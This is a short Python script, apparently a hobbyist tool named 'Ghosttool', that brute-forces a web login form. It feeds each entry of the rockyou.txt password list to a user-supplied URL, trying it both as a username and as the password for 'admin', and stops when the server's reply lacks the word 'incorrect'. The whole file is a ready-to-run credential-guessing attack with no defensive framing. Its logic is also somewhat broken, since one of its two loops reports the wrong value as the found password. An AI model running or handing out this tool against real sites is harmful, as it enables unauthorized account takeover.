import requests
import sys
import os

os.system("figlet BRUTEFORCE")
print ("----------Ghosttool----------")

url = input  ("URL   : ")
expression = "incorrect"
def brute(username,password):
	data = {'username':username,'password':password}
	r = requests.post(url,data=data)
	if expression not in r.content :
		print "[+] Correct password Found: ",password
		sys.exit()
	else:
		print r.content," ",password




def main():
	words = [w.strip() for w in open("rockyou.txt", "rb").readlines()] #parse wordlist
	for payload in words:
		brute(payload,"a")
		brute("admin",payload)


if __name__ == '__main__':
	main()
